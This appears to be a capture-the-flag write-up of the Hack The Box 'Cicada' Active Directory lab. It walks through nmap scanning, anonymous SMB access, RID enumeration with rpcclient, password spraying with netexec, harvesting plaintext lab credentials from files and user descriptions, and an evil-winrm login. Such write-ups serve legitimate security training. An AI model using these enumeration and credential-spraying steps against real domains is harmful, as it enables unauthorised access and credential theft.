Starting off with an nmap scan!
`nmap -v -sC -sV nmap/cicada/cicada.nmap 10.129.231.149`
```PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-17 11:58:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-17T11:59:36+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:     9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1:   2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
|_SHA-256: c8b9 54cb f36f 460f 859f 24c6 f4b1 7245 3eec 001b ce26 2f62 7229 4374 b24d 0772
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:     9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1:   2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
|_SHA-256: c8b9 54cb f36f 460f 859f 24c6 f4b1 7245 3eec 001b ce26 2f62 7229 4374 b24d 0772
|_ssl-date: 2026-02-17T11:59:36+00:00; +6h59m55s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-17T11:59:36+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:     9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1:   2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
|_SHA-256: c8b9 54cb f36f 460f 859f 24c6 f4b1 7245 3eec 001b ce26 2f62 7229 4374 b24d 0772
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:     9ec5 1a23 40ef b5b8 3d2c 39d8 447d db65
| SHA-1:   2c93 6d7b cfd8 11b9 9f71 1a5a 155d 88d3 4a52 157a
|_SHA-256: c8b9 54cb f36f 460f 859f 24c6 f4b1 7245 3eec 001b ce26 2f62 7229 4374 b24d 0772
|_ssl-date: 2026-02-17T11:59:36+00:00; +6h59m55s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2026-02-17T11:58:59
|_  start_date: N/A

```
Alot to unpack here, but here are the key elements

1. SMB sign on anonymous
2. Domain of  `CICADA-DC-CA` 
3. LDAP `cicada.htb`

### SMB Time
Since anonymous logging is possible lets start with `smbclient` 
![[Pasted image 20260217000532.png]]
From this we can see an uncommon share of HR
So `smbclient //10.129.231.149/HR`
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ smbclient //10.129.231.149/HR
Password for [WORKGROUP\lazarus]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

```
From this using the `get` command we can download the file!
Reading the file we see that there is a user with a default password of `Cicada$M6Corpb*@Lp#nZp!8`
Lets see if we can find that user!



### Enum4linux-ng
Using the Enum4linux-ng command allows for multiple set of attempts of enumeration!

```bash
 ===========================================
|    RPC Session Check on 10.129.231.149    |
 ===========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'kfcmmiey' and password ''
[H] Rerunning enumeration with user 'kfcmmiey' might give more results


```

Now using `rpcclient` we can access the account!
```bash
└─$ rpcclient -U '' 10.129.231.149    
Password for [WORKGROUP\]:
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
rpcclient $> 

```

Looking for the ability to get the RID and the SID from the account
Taking the SID from below, one can add `-500` to see if you can get user accounts
```bash
rpcclient $> lsaquery
Domain Name: CICADA
Domain Sid: S-1-5-21-917908876-1423158569-3159038727
```

Methods of using `netexec` and others did not work so this was done manually.
```bash
┌──(lazarus㉿Xerek)-[~]
└─$ rpcclient -U '' 10.129.231.149                   
Password for [WORKGROUP\]:
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-501
S-1-5-21-917908876-1423158569-3159038727-501 CICADA\Guest (1)
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-502
S-1-5-21-917908876-1423158569-3159038727-502 CICADA\krbtgt (1)
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1104
S-1-5-21-917908876-1423158569-3159038727-1104 CICADA\john.smoulder (1)
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1105
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1106
S-1-5-21-917908876-1423158569-3159038727-1106 CICADA\michael.wrightson (1)
S-1-5-21-917908876-1423158569-3159038727-1105 CICADA\sarah.dantelia (1)
rpcclient $> lookupsids S-1-5-21-917908876-1423158569-3159038727-1108
S-1-5-21-917908876-1423158569-3159038727-1108 CICADA\david.orelious (1)
```

Now that we have complied a user list of
* john.smoulder
* sarah.dantelia
* david.orelious
* michael.wrightson
And the password of
* Cicada$M6Corpb*@Lp#nZp!8

We can run `netexec` to see if we can get some sign ons!
`netexec smb cicada.htb -u nmap/cicada/userlist.rpc -p nmap/cicada/passlist.rpc`
And it seems like `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` was a hit!

Going back to the Rpcclient, lets see if I can access anything else!
`rpcclient -U michael.wrightson 10.129.231.149 `
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
# New user alert (Adding to the user file)
user:[emily.oscars] rid:[0x641]
# Check the groups
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Groups] rid:[0x44f]
```
Now using either `queryuser rid` or `querygroup rid`
One can see useful information!
Looking into the users... david seems to have left his password.
```bash
        Num Members:7
rpcclient $> queryuser 0x454
        User Name   :   david.orelious
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Just in case I forget my password is aRt$Lp#7t*VQ!3
```


Going back to the shares, going through all of them as david I was able to access the NETLOGON and found a backup script.

```bash
└─$ cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

# Credssssss
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
Another password.

`evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`
User flag down.

Check out these perms...backup and restore
```bash
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```